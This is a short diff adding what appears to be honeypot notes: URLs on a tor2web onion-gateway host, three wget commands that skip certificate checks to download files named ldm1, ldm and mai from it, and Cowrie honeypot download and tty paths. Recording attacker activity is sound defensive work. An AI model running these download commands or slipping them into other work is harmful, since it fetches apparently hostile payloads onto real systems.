@@ -1,0 +1,23 @@
+https://an7kmd2wp4xo7hpr.tor2web.su/src/ldm/
+https://an7kmd2wp4xo7hpr.tor2web.su/src/ldm/images/ico/a64x75.ico
+https://an7kmd2wp4xo7hpr
+
+
+
+
+images/
+images/ico/a.ico
+
+
+
+wget --no-check-certificate https://an7kmd2wp4xo7hpr.tor2web.su/src/ldm1
+wget --no-check-certificate https://an7kmd2wp4xo7hpr.tor2web.su/src/ldm
+wget --no-check-certificate https://an7kmd2wp4xo7hpr.tor2web.su/src/mai
+
+
+
+
+
+/home/cowrie/cowrie/var/lib/cowrie/downloads/
+
+/home/cowrie/cowrie/var/lib/cowrie/tty/
